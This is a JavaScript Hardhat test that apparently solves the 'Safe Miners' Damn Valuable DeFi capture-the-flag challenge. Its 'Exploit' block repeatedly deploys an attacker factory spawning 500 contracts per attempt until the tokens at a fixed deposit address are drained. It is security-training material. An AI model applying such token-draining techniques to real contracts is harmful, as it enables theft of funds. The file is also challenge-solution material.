const { ethers } = require('hardhat');
const { expect } = require('chai');

describe('[Challenge] Safe Miners', function () {
    let deployer, attacker;

    const DEPOSIT_TOKEN_AMOUNT = ethers.utils.parseEther('2000042');
    const DEPOSIT_ADDRESS = '0x79658d35aB5c38B6b988C23D02e0410A380B8D5c';

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        [deployer, attacker] = await ethers.getSigners();

        // Deploy Damn Valuable Token contract
        this.token = await (await ethers.getContractFactory('DamnValuableToken', deployer)).deploy();

        // Deposit the DVT tokens to the address
        await this.token.transfer(DEPOSIT_ADDRESS, DEPOSIT_TOKEN_AMOUNT);

        // Ensure initial balances are correctly set
        expect(await this.token.balanceOf(DEPOSIT_ADDRESS)).eq(DEPOSIT_TOKEN_AMOUNT);
        expect(await this.token.balanceOf(attacker.address)).eq('0');
    });

    it('Exploit', async function () {
        //Can't have timeouts because this will take a while
        this.timeout(0);

        let attempt = 1;
        let attackerBalance = 0;
        do {
            console.log("## ATTEMPT: ", attempt);
            // Deploy a factory that deploys 500 attackers until we have the tokens
            await (await ethers.getContractFactory('SafeMinersAttackerFactory', attacker)).deploy(this.token.address, 500);
            
            //Check the attacker balance
            attackerBalance = await this.token.balanceOf(attacker.address);
            console.log("## CURRENT BALANCE: ", ethers.utils.formatEther(attackerBalance));
            console.log("## ------------------");

            attempt++;
        } while(attackerBalance < DEPOSIT_TOKEN_AMOUNT)
    });

    after(async function () {
        /** SUCCESS CONDITIONS */
        // The attacker took all tokens available in the deposit address
        expect(
            await this.token.balanceOf(DEPOSIT_ADDRESS)
        ).to.eq('0');
        expect(
            await this.token.balanceOf(attacker.address)
        ).to.eq(DEPOSIT_TOKEN_AMOUNT);
    });
});
